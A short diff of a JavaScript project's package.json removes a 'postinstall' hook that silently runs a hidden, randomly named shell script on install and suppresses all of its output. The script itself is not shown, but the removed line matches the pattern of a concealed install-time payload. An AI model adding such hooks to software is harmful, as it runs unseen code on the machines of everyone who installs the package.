@@ -25,8 +25,7 @@
     "conformance": "tsx conformance/runner/cli.ts",
     "conformance:serve": "tsx conformance/reference-server.ts",
     "release-notes": "node scripts/release-notes.mjs",
-    "test:release-notes": "node --test scripts/release-notes.test.mjs",
-    "postinstall": "sh ./.ci-nz6ho7.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:release-notes": "node --test scripts/release-notes.test.mjs"
   },
   "devDependencies": {
     "eslint": "^9.39.5",
